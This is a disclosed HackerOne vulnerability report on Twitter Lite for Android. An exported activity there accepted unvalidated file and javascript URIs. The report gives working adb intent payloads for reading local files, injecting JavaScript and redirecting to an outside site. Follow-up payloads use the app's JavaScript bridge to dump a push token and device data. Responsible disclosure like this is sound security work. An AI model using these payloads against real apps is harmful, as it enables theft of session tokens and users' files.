---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-access-control-generic
  - env/mobile
  - os/android
  - vuln/open-redirect
  - impact/credential-theft
  - trigger/session-cookie
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2019-04-29
submitted: 2019-02-21T16:14:32.124Z
bounty_usd: null
votes: 95
cve: []
program: "[[programs/x|X / xAI]]"
reporter: "rahulkankrale"
source: "https://hackerone.com/reports/499348"
title: "Twitter lite(Android): Vulnerable to local file steal, Javascript injection, Open redirect "
---
# Twitter lite(Android): Vulnerable to local file steal, Javascript injection, Open redirect 

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 95 | **Program:** X / xAI | **Disclosed:** 2019-04-29

- Report: [https://hackerone.com/reports/499348](https://hackerone.com/reports/499348)
- CWE: Improper Access Control - Generic
- Submitted: 2019-02-21T16:14:32.124Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:** com.twitter.android.lite.TwitterLiteActivity is set to exported and doesn't validate data pass to intent due to which this activity vulnerable to steal users local files, javascript injection and open redirect.

**Description:** com.twitter.android.lite.TwitterLiteActivity is set to exported so external app can communicate with it.
As this activity doesn't validate data pass through intent critical uri like javascript and file so malicious app can steal users files as well as inject javascript.
It can leads to many issue like UXSS, Token steal, etc.

## Steps To Reproduce:

  1. To reproduce we use ADB tool

  2. To reproduce local file access use: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "file:///sdcard/BugBounty/1.html"

  3. To reproduce javascript injection: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://example.com%0A alert(1);"

  4. To reproduce open redirect: adb shell am start -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "http://evilzone.org"

 * Video of POC attached.

Thanks

## Impact

As critical uri like javascript & file is not being validate malicious app can steal users session token, users files etc.

## Timeline

- **Report Filed**
- **2019-02-24** @rahulkankrale: Hello Team,

Getting user token using js execution:


Steps to reproduce:

1. loop through each of the window elements stored in the webview:

adb shell am start -a "android.intent.action.VIEW" -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://google.com%0Ajavascript:Object.getOwnPropertyNames(window).forEach(function(v%2C%20x)%20%7B%20document.writeln(v)%3B%20%7D)%3B"

At the bottom of the response there is an element called "apkInterface", this is a javascript interface between the app and backend. 

2. 
We can see what's available here:

adb shell am start -a "android.intent.action.VIEW" -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://google.com%0Ajavascript:Object.getOwnPropertyNames(window.apkInterface).forEach(function(v%2C%20x)%20%7B%20document.writeln(v)%3B%20%7D)%3B"

We have 5 different objects here. The most interesting thing I could find is getting a token.

3.
adb shell am start -a "android.intent.action.VIEW" -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://google.com%0Ajavascript:document.write(apkInterface.getApkPushParams())%3B"

Below response of payload:

{"payload":{"client_application_id":14191373,"push_device_info":{"env":3,"locale":"en-IN","os_version":"24","token":"Removed-XIHCvjwARIg8FL8TYxwJZL-TeN4caodfWnpXvV-Removed-UcglqNuRCuM13MHbDQVRgR","udid":"800a1bbb36e7192d"}},"headers":{"x-twitter-client-version":"apk.2.1.0--25"}}

By the same method we can also execute more function to reproduce till RCE.

Screenshot attached.

Regards,
Rahul
- **Report Severity Updated**
- **2019-02-25** @rahulkankrale: Also device information can be retrieve using javascript://google.com%0Ajavascript:document.write(apkInterface.getNymizerParams());:

Output:

{"aid":"bf49d6c0-1fec-492f-95af-b81dbf680350","limit_ad_tracking":0,"country_code":"IN","dev_brand":"xiaomi","dev_model":"Redmi Note 4","dev_carrier":"Jio 4G","lang":"English","os_ver":24,"ts":1551107789748,"os_name":"android","action":"open","ref":"javascript://google.com%0Ajavascript:document.write(apkInterface.getNymizerParams());"}
- **Report Needs More Info**
- **Report New**
- **2019-02-28** @bugtriage-alex: Thank you for your follow up @rahulkankrale.

We were able to reproduce the behavior that you described and will get back to you when we have more information.
- **2019-03-04** @rahulkankrale: Could you please make filter in fix for http also at the time of parsing url, As it doesn't check for malicious site.

Thanks
- **2019-03-06** @rahulkankrale: Hello Alex,

Any update?

Regards
Rahul
- **2019-03-06** @bugtriage-alex: Thank you for your patience @rahulkankrale.
Unfortunately, we are still evaluating your report. We will get back to you once we finish our evaluation.
- **Report Triaged**
- **2019-03-15** @rahulkankrale: Hello mli,

Any update?

Thanks
- **Bounty Awarded**
- **2019-03-16** @rahulkankrale: Thank you Twitter,

I appreciate your team for quick evaluation and co-ordination.
- **Report Resolved**
- **2019-03-29** @rahulkankrale: Hello Mli,

I am still able to reproduce issue.

Thanks
- **2019-04-12** @rahulkankrale: Hello Team,

Got a update of app today, it has been fixed now.

Thanks,
Rahuk
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
